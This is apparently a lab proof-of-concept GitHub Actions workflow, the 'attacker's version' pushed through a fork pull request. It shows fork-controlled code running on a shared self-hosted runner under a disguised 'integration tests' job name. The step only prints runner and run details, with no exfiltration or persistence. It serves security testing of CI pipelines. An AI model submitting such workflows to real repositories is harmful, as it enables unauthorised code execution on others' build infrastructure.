# POCON — Fork-controlled execution on a shared self-hosted runner (lab harness)
#
# This is the *attacker's* version of the workflow, pushed via a fork PR.
# On pull_request from the fork, GitHub runs the fork's workflow file — the
# exact mechanism exploited in the TensorFlow self-hosted runner disclosure.
# This beacon proves the code-execution primitive without persistence or exfil.

name: "Lab: AArch64 Linux LedBlinker (mirror)"

on:
  pull_request:
    branches: [devel, release/**]

permissions:
  contents: read

jobs:
  aarch64-integration:
    name: "AArch64 Linux Integration Tests"
    runs-on: [self-hosted, aarch64-linux]
    timeout-minutes: 5
    steps:
      - name: "POCON — fork-controlled code on shared self-hosted runner"
        run: |
          echo "[POCON] event:          ${{ github.event_name }}"
          echo "[POCON] head branch:    ${{ github.head_ref }}"
          echo "[POCON] source repo:    ${{ github.repository }}"
          echo "[POCON] run id:         ${{ github.run_id }}"
          echo "[POCON] runner hostname: $(hostname)"
          echo "[POCON] runner user:     $(id -un 2>/dev/null || echo Windows:$(whoami))"
          echo "[POCON] RUNNER_TRACKING_ID: ${RUNNER_TRACKING_ID:-(none)}"
          echo "[POCON] timestamp:      $(date -u +%FT%TZ 2>/dev/null || echo $(Get-Date -Format o))"
          echo ""
          echo "[POCON] SUCCESS: Fork-controlled workflow executed arbitrary steps"
          echo "[POCON] on a shared self-hosted runner — CICD-SEC-04 proven."
        shell: bash